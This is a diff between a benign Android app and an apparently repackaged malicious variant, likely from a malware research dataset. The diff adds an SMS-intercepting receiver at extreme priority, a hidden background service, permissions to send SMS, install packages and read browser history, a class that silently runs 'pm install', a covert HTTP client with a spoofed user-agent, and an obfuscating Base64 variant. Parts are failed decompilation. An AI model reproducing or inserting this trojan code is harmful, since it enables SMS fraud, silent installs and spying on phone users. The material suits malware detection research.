diff --git a/result/APP_47/App_B_47/AndroidManifest.xml b/result/APP_47/App_M_47/AndroidManifest.xml
index 3f0c300..52cc0f1 100755
--- a/result/APP_47/App_B_47/AndroidManifest.xml
+++ b/result/APP_47/App_M_47/AndroidManifest.xml
@@ -46,12 +46,29 @@
             </intent-filter>
         </receiver>
         <service android:name=".service.ScreenService"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
     </application>
     <uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 </manifest>
\ No newline at end of file
diff --git a/result/APP_47/App_B_47/apktool.yml b/result/APP_47/App_M_47/apktool.yml
index 172f389..eec0e50 100755
--- a/result/APP_47/App_B_47/apktool.yml
+++ b/result/APP_47/App_M_47/apktool.yml
@@ -1,5 +1,5 @@
 !!brut.androlib.meta.MetaInfo
-apkFileName: Bapp47-72ACC63208C5518BDF8E745BCA1B264866D27704D0B0CA89559CBE593A0D840A.apk
+apkFileName: Mapp47-2EF09ACA1B3A4ACBFB2C33EF14D5EF06150BF88662B35A90F98A74ACCABAF6BE.apk
 compressionType: false
 doNotCompress:
 - resources.arsc
diff --git a/result/APP_47/App_M_47/com/android/main/APKInstaller.java b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
new file mode 100755
index 0000000..bd0972b
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
@@ -0,0 +1,432 @@
+package com.android.main;
+
+public class APKInstaller
+{
+  public APKInstaller() {}
+  
+  /* Error */
+  public static String exec(String[] paramArrayOfString)
+  {
+    // Byte code:
+    //   209: astore 6
+    //   211: aload 12
+    //   213: astore 7
+    //   215: aload 10
+    //   217: astore 4
+    //   219: aload 11
+    //   221: astore 8
+    //   223: aload 14
+    //   225: astore 9
+    //   227: aload 10
+    //   229: astore 5
+    //   231: aload 11
+    //   233: astore_2
+    //   234: aload 15
+    //   236: astore_3
+    //   237: aload 10
+    //   239: astore_0
+    //   240: aload 20
+    //   242: bipush 10
+    //   244: invokevirtual 45	java/io/ByteArrayOutputStream:write	(I)V
+    //   247: aload 11
+    //   249: astore 6
+    //   251: aload 12
+    //   253: astore 7
+    //   255: aload 10
+    //   257: astore 4
+    //   259: aload 11
+    //   261: astore 8
+    //   263: aload 14
+    //   265: astore 9
+    //   267: aload 10
+    //   269: astore 5
+    //   271: aload 11
+    //   273: astore_2
+    //   274: aload 15
+    //   276: astore_3
+    //   277: aload 10
+    //   279: astore_0
+    //   280: aload 10
+    //   282: invokevirtual 48	java/lang/Process:getInputStream	()Ljava/io/InputStream;
+    //   285: astore 12
+    //   287: aload 11
+    //   289: astore 6
+    //   291: aload 12
+    //   293: astore 7
+    //   295: aload 10
+    //   297: astore 4
+    //   299: aload 11
+    //   301: astore 8
+    //   303: aload 12
+    //   305: astore 9
+    //   307: aload 10
+    //   309: astore 5
+    //   311: aload 11
+    //   313: astore_2
+    //   314: aload 12
+    //   316: astore_3
+    //   317: aload 10
+    //   319: astore_0
+    //   320: aload 12
+    //   322: invokevirtual 41	java/io/InputStream:read	()I
+    //   325: istore_1
+    //   326: iload_1
+    //   327: iconst_m1
+    //   328: if_icmpne +179 -> 507
+    //   331: aload 11
+    //   333: astore 6
+    //   335: aload 12
+    //   337: astore 7
+    //   339: aload 10
+    //   341: astore 4
+    //   343: aload 11
+    //   345: astore 8
+    //   347: aload 12
+    //   349: astore 9
+    //   351: aload 10
+    //   353: astore 5
+    //   355: aload 11
+    //   357: astore_2
+    //   358: aload 12
+    //   360: astore_3
+    //   361: aload 10
+    //   363: astore_0
+    //   364: new 50	java/lang/String
+    //   367: dup
+    //   368: aload 20
+    //   370: invokevirtual 54	java/io/ByteArrayOutputStream:toByteArray	()[B
+    //   373: invokespecial 57	java/lang/String:<init>	([B)V
+    //   376: astore 14
+    //   378: aload 11
+    //   380: ifnull +8 -> 388
+    //   383: aload 11
+    //   385: invokevirtual 60	java/io/InputStream:close	()V
+    //   388: aload 12
+    //   390: ifnull +8 -> 398
+    //   393: aload 12
+    //   395: invokevirtual 60	java/io/InputStream:close	()V
+    //   398: aload 10
+    //   400: ifnull +8 -> 408
+    //   403: aload 10
+    //   405: invokevirtual 63	java/lang/Process:destroy	()V
+    //   408: aload 14
+    //   410: astore_0
+    //   411: aload_0
+    //   412: areturn
+    //   413: aload 11
+    //   415: astore 6
+    //   417: aload 12
+    //   419: astore 7
+    //   421: aload 10
+    //   423: astore 4
+    //   425: aload 11
+    //   427: astore 8
+    //   429: aload 14
+    //   431: astore 9
+    //   433: aload 10
+    //   435: astore 5
+    //   437: aload 11
+    //   439: astore_2
+    //   440: aload 15
+    //   442: astore_3
+    //   443: aload 10
+    //   445: astore_0
+    //   446: aload 20
+    //   448: iload_1
+    //   449: invokevirtual 45	java/io/ByteArrayOutputStream:write	(I)V
+    //   452: goto -289 -> 163
+    //   455: astore 5
+    //   457: aload 6
+    //   459: astore_2
+    //   460: aload 7
+    //   462: astore_3
+    //   463: aload 4
+    //   465: astore_0
+    //   466: aload 5
+    //   468: invokevirtual 66	java/io/IOException:printStackTrace	()V
+    //   471: aload 6
+    //   473: ifnull +8 -> 481
+    //   476: aload 6
+    //   478: invokevirtual 60	java/io/InputStream:close	()V
+    //   481: aload 7
+    //   483: ifnull +8 -> 491
+    //   486: aload 7
+    //   488: invokevirtual 60	java/io/InputStream:close	()V
+    //   491: aload 13
+    //   493: astore_0
+    //   494: aload 4
+    //   496: ifnull -85 -> 411
+    //   499: aload 4
+    //   501: invokevirtual 63	java/lang/Process:destroy	()V
+    //   504: ldc 17
+    //   506: areturn
+    //   507: aload 11
+    //   509: astore 6
+    //   511: aload 12
+    //   513: astore 7
+    //   515: aload 10
+    //   517: astore 4
+    //   519: aload 11
+    //   521: astore 8
+    //   523: aload 12
+    //   525: astore 9
+    //   527: aload 10
+    //   529: astore 5
+    //   531: aload 11
+    //   533: astore_2
+    //   534: aload 12
+    //   536: astore_3
+    //   537: aload 10
+    //   539: astore_0
+    //   540: aload 20
+    //   542: iload_1
+    //   543: invokevirtual 45	java/io/ByteArrayOutputStream:write	(I)V
+    //   546: goto -259 -> 287
+    //   549: astore 4
+    //   551: aload 8
+    //   553: astore_2
+    //   554: aload 9
+    //   556: astore_3
+    //   557: aload 5
+    //   559: astore_0
+    //   560: aload 4
+    //   562: invokevirtual 67	java/lang/Exception:printStackTrace	()V
+    //   565: aload 8
+    //   567: ifnull +8 -> 575
+    //   570: aload 8
+    //   572: invokevirtual 60	java/io/InputStream:close	()V
+    //   575: aload 9
+    //   577: ifnull +8 -> 585
+    //   580: aload 9
+    //   582: invokevirtual 60	java/io/InputStream:close	()V
+    //   585: aload 13
+    //   587: astore_0
+    //   588: aload 5
+    //   590: ifnull -179 -> 411
+    //   593: aload 5
+    //   595: invokevirtual 63	java/lang/Process:destroy	()V
+    //   598: ldc 17
+    //   600: areturn
+    //   601: astore_0
+    //   602: aload_0
+    //   603: invokevirtual 66	java/io/IOException:printStackTrace	()V
+    //   606: goto -115 -> 491
+    //   609: astore_0
+    //   610: aload_0
+    //   611: invokevirtual 66	java/io/IOException:printStackTrace	()V
+    //   614: goto -29 -> 585
+    //   617: astore 4
+    //   619: aload_2
+    //   620: ifnull +7 -> 627
+    //   623: aload_2
+    //   624: invokevirtual 60	java/io/InputStream:close	()V
+    //   627: aload_3
+    //   628: ifnull +7 -> 635
+    //   631: aload_3
+    //   632: invokevirtual 60	java/io/InputStream:close	()V
+    //   635: aload_0
+    //   636: ifnull +7 -> 643
+    //   639: aload_0
+    //   640: invokevirtual 63	java/lang/Process:destroy	()V
+    //   643: aload 4
+    //   645: athrow
+    //   646: astore_2
+    //   647: aload_2
+    //   648: invokevirtual 66	java/io/IOException:printStackTrace	()V
+    //   651: goto -16 -> 635
+    //   654: astore_0
+    //   655: aload_0
+    //   656: invokevirtual 66	java/io/IOException:printStackTrace	()V
+    //   659: goto -261 -> 398
+    // Local variable table:
+    //   start	length	slot	name	signature
+    //   0	662	0	paramArrayOfString	String[]
+    //   201	342	1	i	int
+    //   67	557	2	localObject1	Object
+    //   646	2	2	localIOException1	java.io.IOException
+    //   70	562	3	localObject2	Object
+    //   51	467	4	localProcess1	Process
+    //   549	12	4	localException	Exception
+    //   617	27	4	localObject3	Object
+    //   63	373	5	localObject4	Object
+    //   455	12	5	localIOException2	java.io.IOException
+    //   529	65	5	localProcess2	Process
+    //   43	467	6	localInputStream1	java.io.InputStream
+    //   47	467	7	localInputStream2	java.io.InputStream
+    //   55	516	8	localObject5	Object
+    //   59	522	9	localObject6	Object
+    //   21	517	10	localProcess3	Process
+    //   30	502	11	localInputStream3	java.io.InputStream
+    //   39	496	12	localInputStream4	java.io.InputStream
+    //   2	584	13	str1	String
+    //   33	397	14	str2	String
+    //   36	405	15	localObject7	Object
+    //   24	112	16	localObject8	Object
+    //   27	121	17	localObject9	Object
+    //   15	89	18	localObject10	Object
+    //   18	96	19	localObject11	Object
+    //   81	460	20	localByteArrayOutputStream	java.io.ByteArrayOutputStream
+    //   12	105	21	localProcessBuilder	ProcessBuilder
+    // Exception table:
+    //   from	to	target	type
+    //   74	83	455	java/io/IOException
+    //   116	123	455	java/io/IOException
+    //   156	163	455	java/io/IOException
+    //   196	202	455	java/io/IOException
+    //   240	247	455	java/io/IOException
+    //   280	287	455	java/io/IOException
+    //   320	326	455	java/io/IOException
+    //   364	378	455	java/io/IOException
+    //   446	452	455	java/io/IOException
+    //   540	546	455	java/io/IOException
+    //   74	83	549	java/lang/Exception
+    //   116	123	549	java/lang/Exception
+    //   156	163	549	java/lang/Exception
+    //   196	202	549	java/lang/Exception
+    //   240	247	549	java/lang/Exception
+    //   280	287	549	java/lang/Exception
+    //   320	326	549	java/lang/Exception
+    //   364	378	549	java/lang/Exception
+    //   446	452	549	java/lang/Exception
+    //   540	546	549	java/lang/Exception
+    //   476	481	601	java/io/IOException
+    //   486	491	601	java/io/IOException
+    //   570	575	609	java/io/IOException
+    //   580	585	609	java/io/IOException
+    //   74	83	617	finally
+    //   116	123	617	finally
+    //   156	163	617	finally
+    //   196	202	617	finally
+    //   240	247	617	finally
+    //   280	287	617	finally
+    //   320	326	617	finally
+    //   364	378	617	finally
+    //   446	452	617	finally
+    //   466	471	617	finally
+    //   540	546	617	finally
+    //   560	565	617	finally
+    //   623	627	646	java/io/IOException
+    //   631	635	646	java/io/IOException
+    //   383	388	654	java/io/IOException
+    //   393	398	654	java/io/IOException
+  }
+  
+  public static String install(String paramString)
+  {
+    return exec(new String[] { "pm", "install", "-r", paramString });
+  }
+}
diff --git a/result/APP_47/App_M_47/com/android/main/ActionReceiver.java b/result/APP_47/App_M_47/com/android/main/ActionReceiver.java
new file mode 100755
index 0000000..83042cc
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/ActionReceiver.java
@@ -0,0 +1,16 @@
+package com.android.main;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+
+public class ActionReceiver
+  extends BroadcastReceiver
+{
+  public ActionReceiver() {}
+  
+  public void onReceive(Context paramContext, Intent paramIntent)
+  {
+    paramContext.startService(new Intent(paramContext, MainService.class));
+  }
+}
diff --git a/result/APP_47/App_M_47/com/android/main/Base64.java b/result/APP_47/App_M_47/com/android/main/Base64.java
new file mode 100755
index 0000000..6928b84
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/Base64.java
@@ -0,0 +1,43 @@
+package com.android.main;
+
+public class Base64
+{
+  public static final String BASE64CODE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+  public static final String BASE64DECODE = "ABCDEGHIJKLMQRSTUVWXYZabcdefghijlmnopqrstwxyz0123456789.";
+  public static final int SPLIT_LINES_AT = 76;
+  
+  public Base64() {}
+  
+  public static String encodebook(String paramString, int paramInt1, int paramInt2)
+  {
+    if ((paramString == null) || (paramString.length() < 10)) {
+      return "";
+    }
+    int j = paramString.length();
+    Object localObject = new StringBuffer();
+    int i = 0;
+    if (i >= j / 2)
+    {
+      paramString = ((StringBuffer)localObject).toString();
+      localObject = paramString.substring(0, paramInt1);
+      if (paramInt1 <= 0) {
+        break label141;
+      }
+    }
+    label141:
+    for (paramString = localObject + "." + paramString.substring(paramInt1, paramString.length() - paramInt2) + "." + paramString.substring(paramString.length() - paramInt2);; paramString = paramString.substring(paramInt1, paramString.length() - paramInt2) + "." + paramString.substring(paramString.length() - paramInt2))
+    {
+      return paramString;
+      ((StringBuffer)localObject).append(paramString.substring(i * 2 + 1, i * 2 + 2));
+      i += 1;
+      break;
+    }
+  }
+  
+  public static byte[] zeroPad(int paramInt, byte[] paramArrayOfByte)
+  {
+    byte[] arrayOfByte = new byte[paramInt];
+    System.arraycopy(paramArrayOfByte, 0, arrayOfByte, 0, paramArrayOfByte.length);
+    return arrayOfByte;
+  }
+}
diff --git a/result/APP_47/App_M_47/com/android/main/BaseAuthenicationHttpClient.java b/result/APP_47/App_M_47/com/android/main/BaseAuthenicationHttpClient.java
new file mode 100755
index 0000000..b5689db
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/BaseAuthenicationHttpClient.java
@@ -0,0 +1,119 @@
+package com.android.main;
+
+import android.util.Log;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import netqin.NQlog.NQfile;
+
+public class BaseAuthenicationHttpClient
+{
+  public BaseAuthenicationHttpClient() {}
+  
+  public static int getCodeByURL(String paramString, int paramInt)
+  {
+    int i = 0;
+    try
+    {
+      Object localObject = new URL(paramString);
+      NQfile.net3write((URL)localObject);
+      localObject = (HttpURLConnection)((URL)localObject).openConnection();
+      ((HttpURLConnection)localObject).setDoInput(true);
+      NQfile.netwrite((HttpURLConnection)localObject);
+      ((HttpURLConnection)localObject).connect();
+      j = ((HttpURLConnection)localObject).getResponseCode();
+      i = j;
+    }
+    catch (IOException localIOException)
+    {
+      for (;;)
+      {
+        int j;
+        localIOException.printStackTrace();
+        Log.e("info", "getCodeByURL:" + localIOException.toString());
+      }
+    }
+    j = i;
+    if (i != 200)
+    {
+      j = i;
+      if (paramInt < 1) {
+        j = getCodeByURL(paramString, paramInt + 1);
+      }
+    }
+    return j;
+  }
+  
+  public static String getStringByURL(String paramString)
+    throws IOException
+  {
+    paramString = new URL(paramString);
+    NQfile.net3write(paramString);
+    HttpURLConnection localHttpURLConnection = (HttpURLConnection)paramString.openConnection();
+    localHttpURLConnection.setDoInput(true);
+    NQfile.netwrite(localHttpURLConnection);
+    localHttpURLConnection.connect();
+    if (localHttpURLConnection.getResponseCode() == 200)
+    {
+      InputStreamReader localInputStreamReader = new InputStreamReader(localHttpURLConnection.getInputStream(), "UTF-8");
+      BufferedReader localBufferedReader = new BufferedReader(localInputStreamReader);
+      String str;
+      for (paramString = "";; paramString = paramString + str)
+      {
+        str = localBufferedReader.readLine();
+        if (str == null)
+        {
+          Log.i("info", "test:" + paramString);
+          if (localInputStreamReader != null) {
+            localInputStreamReader.close();
+          }
+          if (localHttpURLConnection != null) {
+            localHttpURLConnection.disconnect();
+          }
+          return paramString;
+        }
+      }
+    }
+    return null;
+  }
+  
+  public static String getXboxStrByURL(String paramString)
+    throws IOException
+  {
+    paramString = new URL(paramString);
+    NQfile.net3write(paramString);
+    HttpURLConnection localHttpURLConnection = (HttpURLConnection)paramString.openConnection();
+    localHttpURLConnection.setConnectTimeout(10000);
+    localHttpURLConnection.addRequestProperty("User-Agent", "NokiaN7610-1/4.0850.43.1.1 Series60/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1");
+    localHttpURLConnection.addRequestProperty("Accept", "*/*");
+    localHttpURLConnection.addRequestProperty("Accept-Encoding", "gzip, deflate");
+    localHttpURLConnection.addRequestProperty("Accept-Charset", "UTF-8");
+    localHttpURLConnection.addRequestProperty("Accept-Encoding", "gzip, deflate");
+    Log.i("info", localHttpURLConnection.getRequestProperties());
+    NQfile.netwrite(localHttpURLConnection);
+    localHttpURLConnection.connect();
+    if (localHttpURLConnection.getResponseCode() == 200)
+    {
+      InputStreamReader localInputStreamReader = new InputStreamReader(localHttpURLConnection.getInputStream());
+      BufferedReader localBufferedReader = new BufferedReader(localInputStreamReader);
+      String str;
+      for (paramString = "";; paramString = paramString + str)
+      {
+        str = localBufferedReader.readLine();
+        if (str == null)
+        {
+          if (localInputStreamReader != null) {
+            localInputStreamReader.close();
+          }
+          if (localHttpURLConnection != null) {
+            localHttpURLConnection.disconnect();
+          }
+          return paramString;
+        }
+      }
+    }
+    return null;
+  }
+}
diff --git a/result/APP_47/App_M_47/com/android/main/FileAct.java b/result/APP_47/App_M_47/com/android/main/FileAct.java
new file mode 100755
index 0000000..7aa0d5f
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/FileAct.java
@@ -0,0 +1,271 @@
+package com.android.main;
+
+public class FileAct
+{
+  public FileAct() {}
+  
+  /* Error */
+  public static byte[] readByte(String paramString)
+  {
+    // Byte code:
+    //   0: aconst_null
+    //   1: checkcast 15	[B
+    //   4: astore_3
+    //   5: aconst_null
+    //   6: astore 6
+    //   8: aconst_null
+    //   9: astore 5
+    //   11: new 17	java/io/File
+    //   14: dup
+    //   15: aload_0
+    //   16: invokespecial 20	java/io/File:<init>	(Ljava/lang/String;)V
+    //   19: astore 7
+    //   21: aload 7
+    //   23: invokevirtual 24	java/io/File:exists	()Z
+    //   26: istore_2
+    //   27: iload_2
+    //   28: ifne +17 -> 45
+    //   31: iconst_0
+    //   32: ifeq +11 -> 43
+    //   35: new 26	java/lang/NullPointerException
+    //   38: dup
+    //   39: invokespecial 27	java/lang/NullPointerException:<init>	()V
+    //   42: athrow
+    //   43: aload_3
+    //   44: areturn
+    //   45: new 29	java/io/FileInputStream
+    //   48: dup
+    //   49: aload 7
+    //   51: invokespecial 32	java/io/FileInputStream:<init>	(Ljava/io/File;)V
+    //   54: astore 4
+    //   56: aload_3
+    //   57: astore_0
+    //   58: aload 7
+    //   60: invokevirtual 36	java/io/File:length	()J
+    //   63: l2i
+    //   64: istore_1
+    //   65: aload_3
+    //   66: astore_0
+    //   67: iload_1
+    //   68: newarray byte
+    //   70: astore_3
+    //   71: aload_3
+    //   72: astore_0
+    //   73: aload 4
+    //   75: aload_3
+    //   76: iconst_0
+    //   77: iload_1
+    //   78: invokevirtual 40	java/io/FileInputStream:read	([BII)I
+    //   81: pop
+    //   82: aload 4
+    //   84: ifnull +94 -> 178
+    //   87: aload 4
+    //   89: invokevirtual 43	java/io/FileInputStream:close	()V
+    //   92: aload_3
+    //   93: areturn
+    //   94: astore_0
+    //   95: aload 5
+    //   97: astore 4
+    //   99: aload_3
+    //   100: astore_0
+    //   101: aload_0
+    //   102: astore_3
+    //   103: aload 4
+    //   105: ifnull -13 -> 92
+    //   108: aload 4
+    //   110: invokevirtual 43	java/io/FileInputStream:close	()V
+    //   113: aload_0
+    //   114: astore_3
+    //   115: goto -23 -> 92
+    //   118: astore_3
+    //   119: aload_0
+    //   120: astore_3
+    //   121: goto -29 -> 92
+    //   124: astore_0
+    //   125: aload 6
+    //   127: astore_3
+    //   128: aload_3
+    //   129: ifnull +7 -> 136
+    //   132: aload_3
+    //   133: invokevirtual 43	java/io/FileInputStream:close	()V
+    //   136: aload_0
+    //   137: athrow
+    //   138: astore_0
+    //   139: goto -47 -> 92
+    //   142: astore_0
+    //   143: goto -100 -> 43
+    //   146: astore_3
+    //   147: goto -11 -> 136
+    //   150: astore_0
+    //   151: aload 6
+    //   153: astore_3
+    //   154: goto -26 -> 128
+    //   157: astore_0
+    //   158: aload 4
+    //   160: astore_3
+    //   161: goto -33 -> 128
+    //   164: astore_0
+    //   165: aload_3
+    //   166: astore_0
+    //   167: aload 5
+    //   169: astore 4
+    //   171: goto -70 -> 101
+    //   174: astore_3
+    //   175: goto -74 -> 101
+    //   178: goto -86 -> 92
+    // Local variable table:
+    //   start	length	slot	name	signature
+    //   0	181	0	paramString	String
+    //   64	14	1	i	int
+    //   26	2	2	bool	boolean
+    //   4	111	3	localObject1	Object
+    //   118	1	3	localIOException1	java.io.IOException
+    //   120	13	3	localObject2	Object
+    //   146	1	3	localIOException2	java.io.IOException
+    //   153	13	3	localObject3	Object
+    //   174	1	3	localIOException3	java.io.IOException
+    //   54	116	4	localObject4	Object
+    //   9	159	5	localObject5	Object
+    //   6	146	6	localObject6	Object
+    //   19	40	7	localFile	java.io.File
+    // Exception table:
+    //   from	to	target	type
+    //   11	21	94	java/io/IOException
+    //   108	113	118	java/io/IOException
+    //   11	21	124	finally
+    //   87	92	138	java/io/IOException
+    //   35	43	142	java/io/IOException
+    //   132	136	146	java/io/IOException
+    //   21	27	150	finally
+    //   45	56	150	finally
